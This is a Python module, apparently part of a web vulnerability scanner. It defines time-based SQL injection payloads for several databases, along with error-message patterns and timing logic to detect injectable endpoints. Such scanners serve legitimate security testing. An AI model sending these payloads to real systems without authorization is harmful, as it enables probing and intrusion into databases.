import re
from statistics import median


class SQLi:
    def __init__(self, sleep_s: int = 3, time_threshold: float = 2.2):
        self.name = "SQL Injection"
        self.sleep_s = sleep_s
        self.time_threshold = time_threshold
        self._baseline = None

        s = self.sleep_s
        self.payloads = [
            # MySQL
            f"' OR SLEEP({s})-- -",
            f'" OR SLEEP({s})-- -',
            f"' AND IF(1=1, SLEEP({s}), 0)-- -",
            f'" AND IF(1=1, SLEEP({s}), 0)-- -',
            # MSSQL
            f"' WAITFOR DELAY '0:0:{s}'-- -",
            f'" WAITFOR DELAY "0:0:{s}"-- -',
            # PostgreSQL
            f"' OR pg_sleep({s})-- -",
            f'" OR pg_sleep({s})-- -',
            # Oracle
            f"' AND DBMS_LOCK.SLEEP({s}) --",
            f'" AND DBMS_LOCK.SLEEP({s}) --',
            # SQLite (peso)
            "' AND randomblob(100000)-- -",
            '" AND randomblob(100000)-- -',
        ]

        # SOLO errores reales, sin patrones de 'sleep(' reflejados
        self._err_rx = [
            # MySQL / MariaDB
            r"SQL syntax.*MySQL",
            r"You have an error in your SQL syntax",
            r"Warning.*mysql_",
            r"Unknown column.*in.*field list",
            r"Table.*doesn't exist",
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"syntax error at or near",
            r"relation.*does not exist",
            r"duplicate key value violates unique constraint",
            # MSSQL
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"ODBC SQL Server Driver",
            r"Login failed for user",
            # Oracle
            r"ORA-\d+",
            r"ORA-00942: table or view does not exist",
            r"ORA-00001: unique constraint.*violated",
            # SQLite
            r"SQLite.*error",
            r"no such table",
            r"constraint failed",
            # Genéricos / ORM
            r"PDOException",
            r"QueryException",
            r"SQLSTATE\[\d+\]",
            # Union info-schema (si se refleja en error/página)
            r"union.*select.*from",
            r"select.*from.*information_schema",
        ]
        self._err_compiled = [re.compile(p, re.I) for p in self._err_rx]

    def set_baseline(self, seconds: float):
        self._baseline = seconds

    def get_payloads(self):
        return self.payloads

    def check_response(self, response) -> bool:
        body = response.text or ""

        # Error-based
        if response.status_code >= 500:
            return True
        for rx in self._err_compiled:
            if rx.search(body):
                return True

        # Time-based
        if self._baseline is not None:
            try:
                delta = response.elapsed.total_seconds() - self._baseline
                if delta >= self.time_threshold:
                    return True
            except Exception:
                pass

        return False
